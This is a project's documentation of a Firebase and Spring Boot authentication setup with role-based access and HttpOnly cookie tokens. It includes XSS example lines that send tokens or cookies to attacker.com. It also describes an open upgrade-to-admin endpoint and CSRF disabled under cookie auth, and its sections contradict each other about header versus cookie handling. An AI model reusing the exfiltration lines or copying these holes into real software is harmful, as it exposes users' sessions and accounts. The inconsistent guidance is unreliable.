# STEM Project - Authentication & Security Documentation

## Table of Contents
1. [Overview](#overview)
2. [Authentication Architecture](#authentication-architecture)
3. [Complete Authentication Flow](#complete-authentication-flow)
4. [Security Components](#security-components)
5. [Role-Based Access Control (RBAC)](#role-based-access-control-rbac)
6. [API Endpoints](#api-endpoints)
7. [Security Configuration](#security-configuration)
8. [Database Schema](#database-schema)

---

## Overview

This Spring Boot application implements a **Firebase-based authentication system** with role-based access control (RBAC). The system uses **Firebase Authentication** for user identity verification and a **MySQL database** to store user roles and permissions.

### Key Features
- ✅ Firebase JWT Token Authentication
- ✅ **Secure HttpOnly Cookie-Based Token Storage** (Protection against XSS attacks)
- ✅ Role-Based Access Control (USER, ADMIN)
- ✅ Stateless Session Management
- ✅ Auto User Registration on First Login
- ✅ CORS Configuration for Frontend Integration
- ✅ RESTful API with Spring Security

---

## Authentication Architecture

```
┌─────────────────┐
│   Frontend      │
│   (React/Web)   │
└────────┬────────┘
         │ 1. User logs in with Firebase
         │    (Email/Password, Google, etc.)
         ▼
┌─────────────────┐
│  Firebase Auth  │ ◄── Manages user authentication
└────────┬────────┘
         │ 2. Returns Firebase JWT Token
         │
         ▼
┌─────────────────────────────────────────────────────┐
│                   Backend (Spring Boot)              │
│                                                      │
│  ┌─────────────────────────────────────────────┐   │
│  │  FirebaseTokenFilter                        │   │
│  │  - Extracts JWT from Authorization header   │   │
│  │  - Verifies token with Firebase             │   │
│  │  - Fetches user role from database          │   │
│  │  - Sets Spring Security authentication      │   │
│  └──────────────┬──────────────────────────────┘   │
│                 │                                    │
│                 ▼                                    │
│  ┌─────────────────────────────────────────────┐   │
│  │  SecurityConfig                             │   │
│  │  - Configures endpoint security             │   │
│  │  - Defines public/protected routes          │   │
│  │  - Enables method-level security            │   │
│  └──────────────┬──────────────────────────────┘   │
│                 │                                    │
│                 ▼                                    │
│  ┌─────────────────────────────────────────────┐   │
│  │  Controllers (AuthController, etc.)         │   │
│  │  - Process authenticated requests           │   │
│  │  - Check user roles and permissions         │   │
│  └──────────────┬──────────────────────────────┘   │
│                 │                                    │
│                 ▼                                    │
│  ┌─────────────────────────────────────────────┐   │
│  │  MySQL Database                             │   │
│  │  - Stores user information                  │   │
│  │  - Manages roles (USER, ADMIN)              │   │
│  └─────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘
```

---

## Complete Authentication Flow

### 1. **User Registration & Login (Frontend)**

```javascript
// User signs in with Firebase on frontend
import { signInWithEmailAndPassword } from "firebase/auth";

const userCredential = await signInWithEmailAndPassword(auth, email, password);
const token = await userCredential.user.getIdToken();

// NEW: Store token in secure HttpOnly cookie via backend
await fetch('http://localhost:8080/api/auth/set-token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include', // Important: Include cookies
    body: JSON.stringify({ token: token })
});
// Token is now stored in an HttpOnly cookie, protected from XSS attacks
```

### 2. **Request with Cookie-Based Authentication**

Every API request automatically includes the authentication cookie:

```http
GET /api/products
Cookie: authToken=eyJhbGciOiJSUzI1NiIsImtpZCI6...
```

**Why Cookies are More Secure than Headers:**
- ✅ **HttpOnly Flag**: JavaScript cannot access the cookie, preventing XSS attacks
- ✅ **Automatic Inclusion**: Browser automatically sends cookies with requests
- ✅ **Secure Flag**: Can be configured to only send over HTTPS in production
- ✅ **SameSite Attribute**: Provides CSRF protection
- ❌ **Old Approach (Headers)**: Tokens stored in localStorage are vulnerable to XSS

**Old Approach (DEPRECATED - RISKY):**
```http
GET /api/products
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
```
This approach exposed tokens in localStorage where JavaScript could access and steal them.

### 3. **Token Verification (FirebaseTokenFilter)**

**Location:** `com.org.stem_project.config.FirebaseTokenFilter`

#### Step-by-Step Process:

```
Request arrives → FirebaseTokenFilter.doFilterInternal() is triggered

┌─────────────────────────────────────────────────────────┐
│ STEP 1: Extract Token from HttpOnly Cookie              │
│ - Check if "authToken" cookie exists in request         │
│ - Extract token value from cookie                       │
│ - SECURITY: Cookie is HttpOnly, preventing XSS access   │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│ STEP 2: Verify Token with Firebase                      │
│ - Call FirebaseAuth.getInstance().verifyIdToken(token)  │
│ - Firebase validates: signature, expiration, issuer     │
│ - Returns FirebaseToken object with user info           │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│ STEP 3: Extract User Information                        │
│ - Get email from decoded token                          │
│ - Extract Firebase UID                                  │
│ - Extract name and other claims                         │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│ STEP 4: Check User in Database                          │
│ - Query database by email                               │
│ - If user exists → Get their role from database         │
│ - If user doesn't exist → Assign "NEW_USER" authority   │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│ STEP 5: Set Spring Security Context                     │
│ - Create GrantedAuthority with role (ROLE_USER, etc.)   │
│ - Create UsernamePasswordAuthenticationToken            │
│ - Set authentication in SecurityContextHolder           │
│ - User is now authenticated for this request            │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│ STEP 6: Continue Filter Chain                           │
│ - filterChain.doFilter() → Request proceeds             │
│ - Controller can access Authentication object           │
│ - Role-based security is enforced                       │
└─────────────────────────────────────────────────────────┘
```

#### Code Breakdown:

```java
@Override
protected void doFilterInternal(HttpServletRequest request, 
                               HttpServletResponse response, 
                               FilterChain filterChain) {
    
    // STEP 1: Extract token from HttpOnly cookie (SECURE)
    String token = null;
    Cookie[] cookies = request.getCookies();
    
    if (cookies != null) {
        for (Cookie cookie : cookies) {
            if ("authToken".equals(cookie.getName())) {
                token = cookie.getValue();
                break;
            }
        }
    }
    
    if (token == null || token.isEmpty()) {
        filterChain.doFilter(request, response);
        return; // No token → Continue as unauthenticated
    }
    
    // OLD APPROACH (COMMENTED OUT - DEPRECATED):
    // Reading from Authorization header was risky
    // Tokens in localStorage are vulnerable to XSS attacks
    /*
    String header = request.getHeader("Authorization");
    if (header == null || !header.startsWith("Bearer ")) {
        filterChain.doFilter(request, response);
        return;
    }
    String token = header.substring(7);
    */
    
    try {
        // STEP 2: Verify with Firebase
        FirebaseToken decodedToken = FirebaseAuth.getInstance()
                                                  .verifyIdToken(token);
        
        // STEP 3: Extract user info
        String email = decodedToken.getEmail();
        
        // STEP 4: Check database for role
        List<GrantedAuthority> authorities = new ArrayList<>();
        Optional<User> userOpt = userService.findByEmailT(email);
        
        if (userOpt.isPresent()) {
            String role = userOpt.get().getRole();
            authorities.add(new SimpleGrantedAuthority("ROLE_" + role));
        } else {
            authorities.add(new SimpleGrantedAuthority("NEW_USER"));
        }
        
        // STEP 5: Set Spring Security authentication
        UsernamePasswordAuthenticationToken authentication =
            new UsernamePasswordAuthenticationToken(email, decodedToken, authorities);
        
        SecurityContextHolder.getContext().setAuthentication(authentication);
        
    } catch (FirebaseAuthException e) {
        // Token invalid → Continue as unauthenticated
        System.out.println("Firebase Verification Failed: " + e.getMessage());
    }
    
    // STEP 6: Continue to controller
    filterChain.doFilter(request, response);
}
```

### 4. **First-Time User Registration (AuthController)**

When a new user logs in for the first time:

```java
@PostMapping("/api/auth/check-user")
public ResponseEntity<?> checkUser(Authentication authentication) {
    FirebaseToken token = (FirebaseToken) authentication.getCredentials();
    String email = token.getEmail();
    
    Optional<User> userOpt = userService.findByEmailT(email);
    
    if (userOpt.isPresent()) {
        // Existing user
        User user = userOpt.get();
        return ResponseEntity.ok(Map.of(
            "status", "EXISTS", 
            "role", user.getRole()
        ));
    }
    
    // NEW USER: Create with default USER role
    User newUser = new User();
    newUser.setEmail(token.getEmail());
    newUser.setName(token.getName());
    newUser.setFirebaseUid(token.getUid());
    newUser.setRole("USER"); // Default role
    userService.add(newUser);
    
    return ResponseEntity.ok(Map.of(
        "status", "NEW_USER", 
        "role", "USER"
    ));
}
```

---

## Security Components

### 1. **FirebaseConfig**

**Purpose:** Initialize Firebase Admin SDK for server-side token verification

**Location:** `com.org.stem_project.config.FirebaseConfig`

```java
@Configuration
public class FirebaseConfig {
    
    @Bean
    public FirebaseApp firebaseApp() throws IOException {
        // Load service account key from classpath
        ClassPathResource resource = new ClassPathResource("serviceAccountKey.json");
        InputStream serviceAccount = resource.getInputStream();
        
        // Initialize Firebase with credentials
        FirebaseOptions options = FirebaseOptions.builder()
            .setCredentials(GoogleCredentials.fromStream(serviceAccount))
            .build();
        
        // Return singleton Firebase instance
        if (FirebaseApp.getApps().isEmpty()) {
            return FirebaseApp.initializeApp(options);
        }
        return FirebaseApp.getInstance();
    }
}
```

**Key Points:**
- Loads `serviceAccountKey.json` from resources
- Initializes Firebase Admin SDK
- Required for `FirebaseAuth.getInstance().verifyIdToken()`

---

### 2. **SecurityConfig**

**Purpose:** Configure Spring Security for the application

**Location:** `com.org.stem_project.config.SecurityConfig`

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class SecurityConfig {
    
    @Autowired
    private FirebaseTokenFilter firebaseTokenFilter;
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) {
        http
            .csrf(csrf -> csrf.disable()) // Disabled for REST API
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/register", "/", "/index.html", "/api/auth/**")
                    .permitAll() // Public endpoints
                .anyRequest().authenticated() // All others require auth
            )
            .sessionManagement(session ->
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            );
        
        // Add Firebase filter before default authentication
        http.addFilterBefore(firebaseTokenFilter, 
                           UsernamePasswordAuthenticationFilter.class);
        
        return http.build();
    }
}
```

**Security Features:**

| Feature | Configuration | Purpose |
|---------|--------------|---------|
| **CSRF Protection** | Disabled | Not needed for stateless REST APIs |
| **Session Management** | Stateless | No server-side sessions, token-based auth |
| **Public Endpoints** | `/api/auth/**`, `/register`, `/` | Allow access without authentication |
| **Protected Endpoints** | All others | Require valid Firebase token |
| **Custom Filter** | FirebaseTokenFilter | Runs before Spring's default auth |

---

### 3. **FirebaseTokenFilter**

**Purpose:** Intercept every request and verify Firebase JWT tokens

**Type:** `OncePerRequestFilter` (runs once per request)

**Key Responsibilities:**
1. ✅ Extract JWT token from `Authorization` header
2. ✅ Verify token authenticity with Firebase
3. ✅ Extract user information (email, name, UID)
4. ✅ Fetch user role from database
5. ✅ Set Spring Security authentication context
6. ✅ Handle token validation errors gracefully

---

### 4. **CorsConfig**

**Purpose:** Enable Cross-Origin Resource Sharing for frontend applications

**Location:** `com.org.stem_project.config.CorsConfig`

```java
@Configuration
public class CorsConfig {
    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/api/**")
                    .allowedOrigins("http://localhost:3000", 
                                  "http://localhost:8080", 
                                  "http://127.0.0.1:3000")
                    .allowedMethods("GET", "POST", "PUT", "DELETE")
                    .allowedHeaders("*")
                    .allowCredentials(true);
            }
        };
    }
}
```

**Configuration:**
- Allows requests from React dev server (port 3000)
- Permits all HTTP methods for API endpoints
- Enables credentials (cookies, authorization headers)

---

## Role-Based Access Control (RBAC)

### Role Hierarchy

```
┌─────────────────────────────────────────────┐
│                                             │
│  NEW_USER  →  USER  →  ADMIN                │
│     ↓           ↓        ↓                  │
│  No DB     Default  Elevated                │
│  Record    Access   Privileges              │
│                                             │
└─────────────────────────────────────────────┘
```

### Role Descriptions

| Role | Authority | Description | Database Record |
|------|-----------|-------------|----------------|
| **NEW_USER** | `NEW_USER` | First-time Firebase login, not yet in DB | ❌ No |
| **USER** | `ROLE_USER` | Registered user with basic access | ✅ Yes |
| **ADMIN** | `ROLE_ADMIN` | Administrative privileges | ✅ Yes |

### Role Assignment Logic

```java
// In FirebaseTokenFilter
Optional<User> userOpt = userService.findByEmailT(email);

if (userOpt.isPresent()) {
    // User exists in database
    String role = userOpt.get().getRole(); // "USER" or "ADMIN"
    authorities.add(new SimpleGrantedAuthority("ROLE_" + role));
} else {
    // New user, not in database yet
    authorities.add(new SimpleGrantedAuthority("NEW_USER"));
}
```

### Using Roles in Controllers

#### Method 1: `@PreAuthorize` Annotation

```java
@PreAuthorize("hasRole('ADMIN')")
@DeleteMapping("/products/{id}")
public ResponseEntity<?> deleteProduct(@PathVariable Long id) {
    // Only users with ROLE_ADMIN can access
    productService.delete(id);
    return ResponseEntity.ok("Product deleted");
}
```

#### Method 2: Manual Check in Controller

```java
@GetMapping("/admin/dashboard")
public ResponseEntity<?> adminDashboard(Authentication auth) {
    boolean isAdmin = auth.getAuthorities().stream()
        .anyMatch(a -> a.getAuthority().equals("ROLE_ADMIN"));
    
    if (!isAdmin) {
        return ResponseEntity.status(403).body("Access denied");
    }
    
    return ResponseEntity.ok(dashboardData);
}
```

---

## API Endpoints

### Public Endpoints (No Authentication Required)

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Home page |
| `/index.html` | GET | Static HTML |
| `/register` | POST | User registration |
| `/api/auth/**` | ALL | Authentication endpoints |

### Authentication Endpoints

#### 1. Check/Register User
```http
POST /api/auth/check-user
Authorization: Bearer <firebase-jwt-token>
```

**Response (Existing User):**
```json
{
  "status": "EXISTS",
  "role": "USER"
}
```

**Response (New User):**
```json
{
  "status": "NEW_USER",
  "role": "USER"
}
```

#### 2. Get Current User Info
```http
GET /api/auth/user
Authorization: Bearer <firebase-jwt-token>
```

**Response:**
```json
{
  "id": 1,
  "name": "John Doe",
  "email": "john@example.com",
  "role": "USER"
}
```

#### 3. Upgrade User to Admin
```http
POST /api/auth/upgrade-to-admin
Authorization: Bearer <firebase-jwt-token>
```

**Response:**
```json
{
  "message": "User upgraded to ADMIN",
  "role": "ADMIN"
}
```

⚠️ **Security Note:** In production, this endpoint should be protected and only accessible by existing admins.

### Protected Endpoints (Authentication Required)

All endpoints under `/api/products` require valid Firebase authentication:

| Endpoint | Method | Role Required | Description |
|----------|--------|---------------|-------------|
| `/api/products` | GET | USER | List all products |
| `/api/products/{id}` | GET | USER | Get product by ID |
| `/api/products` | POST | ADMIN | Create new product |
| `/api/products/{id}` | PUT | ADMIN | Update product |
| `/api/products/{id}` | DELETE | ADMIN | Delete product |

---

## Security Configuration

### Token Validation Flow

```
Token Received → Extract from Header → Verify with Firebase
                                              │
                                              ▼
                                    ┌─────────────────┐
                                    │  Valid Token?   │
                                    └────┬───────┬────┘
                                         │       │
                                      YES│       │NO
                                         │       │
                                         ▼       ▼
                                   Set Auth   Continue
                                   Context   Unauthenticated
```

### Session Management

**Stateless Architecture:**
- ❌ No server-side sessions (HttpSession)
- ❌ No cookies for authentication
- ✅ Each request carries JWT token
- ✅ Token verified on every request
- ✅ Scales horizontally (no session affinity needed)

### Token Expiration

Firebase tokens expire after **1 hour** by default. Frontend should:

```javascript
// Refresh token before API call
const token = await firebase.auth().currentUser.getIdToken(true);
// Make API request with fresh token
```

---

## Database Schema

### User Table

```sql
CREATE TABLE app_user (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    email VARCHAR(255) UNIQUE NOT NULL,
    name VARCHAR(255),
    firebase_uid VARCHAR(255) NOT NULL,
    role VARCHAR(50) NOT NULL DEFAULT 'USER'
);
```

### Entity Model

```java
@Entity
@Table(name = "app_user")
public class User {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    @Column(unique = true)
    private String email;          // From Firebase token
    
    private String name;            // From Firebase token
    private String firebaseUid;     // Firebase user ID
    private String role;            // "USER" or "ADMIN"
}
```

---

## Security Best Practices Implemented

### ✅ Token-Based Authentication
- No passwords stored in backend
- Firebase handles password security
- JWT tokens are signed and verified

### ✅ Stateless Architecture
- No session state on server
- Easy to scale horizontally
- Works with load balancers

### ✅ Role-Based Access Control
- Granular permission management
- Method-level security
- Database-driven roles

### ✅ CORS Protection
- Whitelist specific origins
- Prevent unauthorized cross-origin requests

### ✅ CSRF Protection
- Disabled for stateless REST API
- Token-based auth is CSRF-resistant

### ✅ Error Handling
- Token validation errors don't crash app
- Graceful degradation to unauthenticated state
- Debug logging for troubleshooting

---

## Common Security Scenarios

### Scenario 1: New User First Login

```
1. User signs up with Firebase → Firebase creates account
2. User logs in → Frontend gets JWT token
3. Frontend calls /api/auth/check-user with token
4. Backend verifies token → User not in DB
5. Backend creates User record with role="USER"
6. Response: {"status": "NEW_USER", "role": "USER"}
```

### Scenario 2: Existing User Login

```
1. User logs in with Firebase → Frontend gets JWT token
2. Frontend calls /api/auth/check-user with token
3. Backend verifies token → User found in DB
4. Backend reads role from database
5. Response: {"status": "EXISTS", "role": "USER"}
```

### Scenario 3: Admin Access

```
1. Admin logs in → Gets JWT token
2. Admin calls protected endpoint with token
3. FirebaseTokenFilter verifies token
4. Filter checks DB → role = "ADMIN"
5. Sets authority = "ROLE_ADMIN"
6. SecurityConfig allows access
7. Controller method executes
```

### Scenario 4: Invalid Token

```
1. Request with expired/invalid token
2. FirebaseTokenFilter attempts verification
3. FirebaseAuthException thrown
4. Catch block logs error
5. Continue filter chain WITHOUT setting authentication
6. SecurityConfig blocks access to protected endpoints
7. Returns 401 Unauthorized
```

---

## Cookie-Based Authentication Security

### Why Cookies Instead of Headers?

#### ❌ Old Approach: Authorization Header with localStorage
```javascript
// RISKY: Token stored in localStorage
localStorage.setItem('authToken', token);

// VULNERABLE: JavaScript can access and steal the token
const stolenToken = localStorage.getItem('authToken');

// XSS Attack Example:
// Malicious script injected via comment/input field
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('authToken'));
</script>
```

**Problems:**
- 🔴 **XSS Vulnerability**: Any JavaScript code can access localStorage
- 🔴 **Token Exposure**: Tokens visible in browser dev tools
- 🔴 **Manual Management**: Developer must manually add headers to every request
- 🔴 **Network Logs**: Tokens appear in network request logs

#### ✅ New Approach: HttpOnly Cookies

```javascript
// SECURE: Token stored in HttpOnly cookie by backend
// Frontend just calls the backend to set it
await fetch('/api/auth/set-token', {
    method: 'POST',
    body: JSON.stringify({ token }),
    credentials: 'include' // Browser automatically includes cookies
});

// PROTECTED: JavaScript CANNOT access the cookie
document.cookie; // "authToken" won't appear here

// XSS Attack Blocked:
// Even if attacker injects script, they cannot steal the token
<script>
  // This will NOT work - HttpOnly cookies are inaccessible to JavaScript
  fetch('https://attacker.com/steal?token=' + document.cookie);
</script>
```

**Benefits:**
- ✅ **XSS Protection**: HttpOnly flag prevents JavaScript access
- ✅ **Automatic Inclusion**: Browser sends cookies with every request
- ✅ **Secure Flag**: Can be configured for HTTPS-only in production
- ✅ **SameSite Attribute**: Provides CSRF protection
- ✅ **Expiration Control**: Backend controls cookie lifetime

### Cookie Configuration

```java
// Backend sets secure cookie
Cookie authCookie = new Cookie("authToken", token);
authCookie.setHttpOnly(true);     // Protection against XSS
authCookie.setSecure(true);       // HTTPS-only in production
authCookie.setPath("/");          // Available for entire app
authCookie.setMaxAge(3600);       // 1 hour expiry
authCookie.setSameSite("Strict"); // CSRF protection
```

### Security Comparison

| Feature | Header + localStorage | HttpOnly Cookie |
|---------|----------------------|-----------------|
| XSS Protection | ❌ Vulnerable | ✅ Protected |
| CSRF Protection | ✅ Not vulnerable | ⚠️ Requires CSRF tokens |
| Auto-send with requests | ❌ Manual | ✅ Automatic |
| Accessible to JavaScript | ❌ Yes (vulnerable) | ✅ No (secure) |
| Mobile App Friendly | ✅ Yes | ⚠️ Requires configuration |
| Expires Automatically | ❌ Manual cleanup | ✅ Browser manages |

### Best Practices

1. **Always use HttpOnly cookies for web applications**
2. **Enable Secure flag in production (HTTPS)**
3. **Set appropriate SameSite attribute**
4. **Implement CSRF protection for cookie-based auth**
5. **Use short expiration times (1 hour or less)**
6. **Refresh tokens before expiry**

---

## Testing Authentication

### Using cURL with Cookies

```bash
# Step 1: Get Firebase token (do this on frontend first)
TOKEN="<your-firebase-jwt-token>"

# Step 2: Store token in cookie
curl -X POST http://localhost:8080/api/auth/set-token \
     -H "Content-Type: application/json" \
     -d "{\"token\":\"$TOKEN\"}" \
     -c cookies.txt

# Step 3: Test protected endpoint with cookie
curl http://localhost:8080/api/auth/user \
     -b cookies.txt

# Step 4: Logout (clear cookie)
curl -X POST http://localhost:8080/api/auth/logout \
     -b cookies.txt \
     -c cookies.txt
```

### Using Postman with Cookies

1. **Login with Firebase** (do this on frontend)
2. **Store token in cookie**:
   - POST to `/api/auth/set-token`
   - Body: `{"token": "<firebase-jwt>"}`
   - Postman automatically manages cookies
3. **Test protected endpoints**:
   - Cookies are automatically included
   - No need to manually add headers

### Using Browser (Recommended)

```javascript
// Frontend automatically manages cookies
// Just make requests with credentials: 'include'

// Check user
await fetch('http://localhost:8080/api/auth/check-user', {
    method: 'POST',
    credentials: 'include' // Browser includes cookies automatically
});

// Get products
await fetch('http://localhost:8080/api/products', {
    credentials: 'include'
});

// Logout
await fetch('http://localhost:8080/api/auth/logout', {
    method: 'POST',
    credentials: 'include'
});
```

---

## API Endpoints

### Public Endpoints (No Authentication Required)

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/` | Home page |
| GET | `/index.html` | Login page |
| POST | `/api/auth/set-token` | Store Firebase token in cookie |

### Protected Endpoints (Authentication Required)

#### Authentication Endpoints

| Method | Endpoint | Description | Required Role |
|--------|----------|-------------|---------------|
| POST | `/api/auth/check-user` | Check/register user | ANY |
| GET | `/api/auth/user` | Get current user info | USER, ADMIN |
| POST | `/api/auth/logout` | Clear authentication cookie | ANY |
| POST | `/api/auth/upgrade-to-admin` | Upgrade user to admin | USER, ADMIN |

#### Product Endpoints

| Method | Endpoint | Description | Required Role |
|--------|----------|-------------|---------------|
| GET | `/api/products` | Get all products | USER, ADMIN |
| GET | `/api/products/{id}` | Get product by ID | USER, ADMIN |
| GET | `/api/products/category/{category}` | Get products by category | USER, ADMIN |
| POST | `/api/products` | Create new product | ADMIN |
| PUT | `/api/products/{id}` | Update product | ADMIN |
| DELETE | `/api/products/{id}` | Delete product | ADMIN |

### Example API Calls

#### 1. Login and Set Cookie
```javascript
// Step 1: Login with Firebase
const userCredential = await signInWithPopup(auth, provider);
const token = await userCredential.user.getIdToken();

// Step 2: Store token in HttpOnly cookie
const response = await fetch('http://localhost:8080/api/auth/set-token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',
    body: JSON.stringify({ token })
});
```

#### 2. Check/Register User
```javascript
const response = await fetch('http://localhost:8080/api/auth/check-user', {
    method: 'POST',
    credentials: 'include' // Cookie automatically included
});
const data = await response.json();
// Returns: { status: "EXISTS" | "NEW_USER", role: "USER" | "ADMIN" }
```

#### 3. Get Current User
```javascript
const response = await fetch('http://localhost:8080/api/auth/user', {
    credentials: 'include'
});
const user = await response.json();
// Returns: { id, name, email, role }
```

#### 4. Create Product (Admin Only)
```javascript
const response = await fetch('http://localhost:8080/api/products', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',
    body: JSON.stringify({
        name: 'Laptop',
        description: 'High-performance laptop',
        price: 1299.99,
        category: 'Electronics',
        stock: 50,
        imageUrl: 'https://example.com/laptop.jpg'
    })
});
```

#### 5. Logout
```javascript
const response = await fetch('http://localhost:8080/api/auth/logout', {
    method: 'POST',
    credentials: 'include'
});
// Cookie is cleared, user is logged out
```

---

## Migration Guide: Headers to Cookies

### For Developers Migrating from Header-Based to Cookie-Based Authentication

#### Changes Required in Frontend Code

**OLD CODE (Header-Based):**
```javascript
// ❌ DEPRECATED: Storing token in localStorage
async function getAuthHeaders() {
    const token = await auth.currentUser.getIdToken();
    return {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
    };
}

// Making authenticated request
const headers = await getAuthHeaders();
const response = await fetch('/api/products', { headers });
```

**NEW CODE (Cookie-Based):**
```javascript
// ✅ SECURE: Token stored in HttpOnly cookie
// Step 1: Store token in cookie after Firebase login
async function storeTokenInCookie() {
    const token = await auth.currentUser.getIdToken(true);
    await fetch('/api/auth/set-token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify({ token })
    });
}

// Step 2: Make authenticated requests (no manual headers needed)
const response = await fetch('/api/products', {
    credentials: 'include' // Browser automatically includes cookie
});
```

#### Key Changes

1. **After Firebase Login**: Call `/api/auth/set-token` to store token
2. **Every Request**: Add `credentials: 'include'`
3. **Remove**: Manual Authorization header creation
4. **Remove**: localStorage token management

#### Changes Required in Backend Code

**OLD CODE (Header-Based):**
```java
// ❌ DEPRECATED: Reading from Authorization header
String header = request.getHeader("Authorization");
if (header != null && header.startsWith("Bearer ")) {
    String token = header.substring(7);
    // verify token...
}
```

**NEW CODE (Cookie-Based):**
```java
// ✅ SECURE: Reading from HttpOnly cookie
String token = null;
Cookie[] cookies = request.getCookies();
if (cookies != null) {
    for (Cookie cookie : cookies) {
        if ("authToken".equals(cookie.getName())) {
            token = cookie.getValue();
            break;
        }
    }
}
```

#### Migration Checklist

- [ ] Update `FirebaseTokenFilter` to read from cookies
- [ ] Add `/api/auth/set-token` endpoint
- [ ] Add `/api/auth/logout` endpoint
- [ ] Update frontend login flow to store token in cookie
- [ ] Add `credentials: 'include'` to all fetch requests
- [ ] Remove localStorage token management code
- [ ] Remove manual Authorization header creation
- [ ] Test authentication flow end-to-end
- [ ] Update API documentation
- [ ] Test logout functionality

### Breaking Changes

⚠️ **Important:** This is a breaking change. Existing clients using header-based authentication will need to update their code to use cookie-based authentication.

**Backwards Compatibility Option:**
If you need to support both approaches temporarily, you can modify the filter to check both:

```java
// Check cookie first (preferred)
String token = extractTokenFromCookie(request);

// Fallback to header for backwards compatibility (temporary)
if (token == null) {
    token = extractTokenFromHeader(request);
}
```

---

## Environment Configuration

### application.properties

```properties
# MySQL Configuration
spring.datasource.url=${DB_URL}
spring.datasource.username=${DB_USERNAME}
spring.datasource.password=${DB_PASSWORD}

# JPA Configuration
spring.jpa.hibernate.ddl-auto=update
spring.jpa.show-sql=true
spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.MySQLDialect

# Server Configuration
server.port=8080
```

### .env File (Not committed to Git)

```env
DB_URL=jdbc:mysql://localhost:3306/stem_db
DB_USERNAME=root
DB_PASSWORD=your_password
```

---

## Troubleshooting

### Problem: "Failed to instantiate FirebaseApp"

**Cause:** `serviceAccountKey.json` not found

**Solution:**
- Ensure file is in `src/main/resources/`
- Check FirebaseConfig uses ClassPathResource
- Verify file is copied to `target/classes/` during build

### Problem: "Token verification failed"

**Cause:** Invalid or expired token

**Solution:**
- Refresh token on frontend: `getIdToken(true)`
- Check Firebase project configuration
- Verify serviceAccountKey matches Firebase project

### Problem: "Access Denied" despite valid token

**Cause:** User not in database or wrong role

**Solution:**
- Call `/api/auth/check-user` to register user
- Check user role in database
- Verify filter is setting authorities correctly

### Problem: "No Auth Token found in cookies"

**Cause:** Cookie not being sent or not set properly

**Solution:**
- Ensure you called `/api/auth/set-token` after Firebase login
- Add `credentials: 'include'` to all fetch requests
- Check browser console for CORS errors
- Verify cookie is visible in browser DevTools (Application > Cookies)
- Note: HttpOnly cookies won't be visible in JavaScript but should appear in browser tools

### Problem: CORS error with credentials

**Cause:** CORS configuration doesn't allow credentials

**Solution:**
Update `CorsConfig.java`:
```java
@Bean
public WebMvcConfigurer corsConfigurer() {
    return new WebMvcConfigurer() {
        @Override
        public void addCorsMappings(CorsRegistry registry) {
            registry.addMapping("/**")
                    .allowedOrigins("http://localhost:3000", "http://localhost:8080")
                    .allowedMethods("GET", "POST", "PUT", "DELETE", "OPTIONS")
                    .allowedHeaders("*")
                    .allowCredentials(true) // ← Important for cookies!
                    .maxAge(3600);
        }
    };
}
```

### Problem: Cookie not persisting after page refresh

**Cause:** Cookie expiration or path issue

**Solution:**
- Check cookie `MaxAge` is set appropriately (default: 3600 seconds)
- Ensure cookie `Path` is set to `/`
- Token may have expired - implement token refresh logic

### Problem: "Cannot read property 'getIdToken' of null"

**Cause:** Firebase user not authenticated

**Solution:**
- Ensure user is logged in to Firebase before calling `getIdToken()`
- Check `onAuthStateChanged` listener is properly set up
- Verify Firebase configuration is correct

---

## Summary

This application implements a **secure, scalable authentication system** using:

1. **Firebase Authentication** for identity management
2. **JWT tokens** for stateless authentication
3. **HttpOnly Cookies** for secure token storage (XSS protection)
4. **Spring Security** for authorization
5. **Role-based access control** for permissions
6. **MySQL database** for user management

### Security Features

✅ **XSS Protection**: HttpOnly cookies prevent JavaScript access to tokens  
✅ **CSRF Protection**: Can be enabled with CSRF tokens  
✅ **Token Expiration**: Automatic cookie expiration  
✅ **Role-Based Access**: Fine-grained permission control  
✅ **Stateless Authentication**: Easy to scale horizontally  
✅ **Firebase Integration**: Industry-standard authentication provider  

### Why This Architecture?

**Cookie-Based Authentication** provides superior security for web applications:
- Tokens cannot be stolen via XSS attacks
- Browser automatically manages cookie lifecycle
- No manual token management in JavaScript
- Better protection against common web vulnerabilities

The system automatically registers new users and supports role-based access control with USER and ADMIN roles. All authentication is stateless, making it easy to scale and deploy in modern cloud environments.

---

## Additional Resources

- [Firebase Authentication Documentation](https://firebase.google.com/docs/auth)
- [Spring Security Documentation](https://docs.spring.io/spring-security/reference/index.html)
- [OWASP Cookie Security Guide](https://owasp.org/www-community/controls/SecureCookieAttribute)
- [MDN Web Docs: HttpOnly Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)

---

**Last Updated:** December 14, 2025  
**Spring Boot Version:** 3.5.7  
**Java Version:** 21  
**Authentication Method:** Cookie-Based (HttpOnly)

